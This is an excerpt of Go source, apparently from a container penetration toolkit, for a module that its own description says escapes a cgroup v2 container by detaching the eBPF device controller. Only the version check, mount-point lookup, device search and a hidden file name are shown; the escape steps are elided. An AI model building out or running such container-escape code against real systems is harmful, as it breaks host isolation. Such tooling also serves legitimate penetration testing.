//go:build linux && !no_cap_dac_boundary
// +build linux,!no_cap_dac_boundary
...
func (p cgroup2EbpfBypassS) Desc() string {
	return "escape cgroup v2 container by detaching eBPF device controller. usage: ./cdk run cgroup2-ebpf-validator"
}
...
func (p cgroup2EbpfBypassS) Run() bool {
	...
	if ver != 2 {
		log.Printf("This check is for Cgroup V2 only. Current version: V%d", ver)
		return false
	}

	cgroupPath, err := findCgroupV2MountPoint()
	if err != nil {
		// fall back to the standard v2 root (resolved from encoded path)
		cgroupPath = util.CgroupRoot()
	}
	...
	for _, mi := range mountInfos {
		if util.FindTargetDeviceID(&mi) {
			...
			resultName := "./.udev_v2_" + util.RandString(6)
